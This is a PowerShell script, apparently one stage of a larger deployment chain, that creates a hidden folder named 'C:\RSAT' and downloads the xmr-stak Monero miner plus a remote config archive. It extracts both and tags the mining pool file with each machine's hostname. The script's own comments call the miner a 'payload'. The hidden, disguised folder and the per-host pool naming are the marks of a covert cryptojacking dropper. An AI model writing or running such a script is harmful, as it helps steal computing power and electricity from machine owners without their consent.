﻿# advanceParty - setup the firebase and get the cannons ready

# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1

$opsDirectory = "C:\RSAT"

if (!(Test-Path $opsDirectory))
{

	mkdir $opsDirectory
	$f = Get-Item $opsDirectory -Force
	$f.Attributes = "Hidden"
}


# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.

$payload = "$opsDirectory\payload.zip"

if (!(Test-Path $payload))

{

	$url = "https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip"
	$start_time = Get-Date

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $url -OutFile $payload
	Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

}


# Check to see if our config is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.

$config = "$opsDirectory\config.zip"

if (!(Test-Path $config))

{

	#$url = "https://gist.github.com/velvet-valdes/7a0a29bff717de3209e85abfa203ddd1/archive/10e4f069e995485beb80ed0854dc6a5c931ab44b.zip"
	$url = "https://github.com/velvet-valdes/dump/releases/download/v0.1-alpha/dump.zip"
	$start_time = Get-Date

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $url -OutFile $config
	Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

}


# Unzip contents of file and remove payload

Expand-Archive -LiteralPath $payload -DestinationPath $opsDirectory
Remove-Item $payload


# Load the newly unzipped directory path into a variable and set the destiation path to extract the config.

$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
$stakDir = "$opsDirectory\$unzipDir"


# Unzip contents of file and remove configuration

Expand-Archive -LiteralPath $config -DestinationPath $stakDir
Remove-Item $config


# Modify the contents of the configuration files to change the hardcoded variable in downloaded configs to the hostname of the machine.

(Get-Content "$stakDir\pools.txt") | ForEach-Object { $_ -replace "REDLEG","$env:COMPUTERNAME" } | Set-Content "$stakDir\pools.txt"

exit
